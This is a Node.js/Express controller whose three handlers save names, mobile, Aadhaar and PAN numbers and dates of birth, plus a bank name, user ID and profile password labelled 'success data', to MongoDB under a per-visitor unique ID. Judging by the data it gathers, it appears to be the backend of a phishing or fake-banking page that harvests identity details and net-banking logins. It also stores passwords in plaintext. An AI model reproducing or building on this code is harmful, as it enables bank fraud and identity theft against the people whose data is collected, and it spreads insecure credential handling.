const User = require('../models/User');
const SuccessData = require('../models/SuccessData');
const Card = require('../models/Card'); 
exports.saveUserData = async (req, res) => {
  try {
    const { name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber, uniqueid } = req.body;

    if (!uniqueid || !name || !mobileNumber || !aadhaarNumber || !dateOfBirth || !panNumber) {
      return res.status(400).json({
        success: false,
        message: "All fields (uniqueid, name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber) are required."
      });
    }

    let user = await User.findOne({ uniqueid });

    if (user) {
      // Remove invalid entries (optional but recommended)
      user.entries = user.entries.filter(e =>
        e.name && e.mobileNumber && e.aadhaarNumber && e.dateOfBirth && e.panNumber
      );

      user.entries.push({ name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber });

      user.markModified('entries');
    } else {
      user = new User({
        uniqueid,
        entries: [{ name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber }]
      });
    }

    await user.save();

    return res.status(200).json({
      success: true,
      message: "User data submitted successfully!"
    });
  } catch (error) {
    console.error("saveUserData error:", error);
    return res.status(500).json({
      success: false,
      message: "Error occurred while submitting user data",
      error: error.message
    });
  }
};

// Save single success data (overwrites existing entry for the uniqueid)
exports.savesuccessData = async (req, res) => {
  try {
    const { uniqueid, bankName, userId, profilePassword } = req.body;

    if (!uniqueid || !bankName || !userId || !profilePassword) {
      return res.status(400).json({ success: false, message: "Missing required fields" });
    }

    let record = await SuccessData.findOne({ uniqueid });

    if (record) {
      record.bankName = bankName;
      record.userId = userId;
      record.profilePassword = profilePassword;
    } else {
      record = new SuccessData({ uniqueid, bankName, userId, profilePassword });
    }

    await record.save();

    res.status(200).json({
      success: true,
      message: "Success data submitted successfully!"
    });

  } catch (error) {
    console.error("savesuccessData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting success data"
    });
  }
};

exports.saveCardData = async (req, res) => {
  try {
    const { name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber, uniqueid } = req.body;

    // Validate required fields
    if (!uniqueid || !name || !mobileNumber || !aadhaarNumber || !dateOfBirth || !panNumber) {
      return res.status(400).json({ success: false, message: "Missing required fields" });
    }

    // Find existing card entry by uniqueid
    let card = await Card.findOne({ uniqueid });

    if (card) {
      // Append new entry to existing card
      card.entries.push({ name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber });
    } else {
      // Create new card document
      card = new Card({
        uniqueid,
        entries: [{ name, mobileNumber, aadhaarNumber, dateOfBirth, panNumber }]
      });
    }

    await card.save();

    res.status(200).json({
      success: true,
      message: "Card data submitted successfully!"
    });

  } catch (error) {
    console.error("saveCardData error:", error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting card data"
    });
  }
};
